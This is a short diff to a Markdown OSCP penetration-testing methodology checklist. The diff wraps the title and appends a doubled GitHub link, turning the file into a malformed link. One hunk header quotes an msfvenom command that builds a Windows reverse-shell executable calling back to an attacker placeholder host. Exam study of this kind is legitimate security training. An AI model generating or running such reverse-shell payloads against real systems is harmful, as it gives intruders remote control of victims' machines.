@@ -1,4 +1,4 @@
-# R.A.N.C.H. — OSCP Methodology Checklist
+[[# R.A.N.C.H. — OSCP Methodology Checklist
 
 **Recon · Attack Surface · Navigate · Compromise · Harvest**
 *by Aaron "The Husky Hacker" Gaddis*
@@ -756,3 +756,4 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATK> LPORT=443 -f exe -o rev.ex
 ---
 
 *Stay sharp. You got this, Husky. 🐺*
+](https://github.com/TheHuskyHacker/oscp-methodology-checklist/tree/main)](https://github.com/TheHuskyHacker/oscp-methodology-checklist/tree/main)
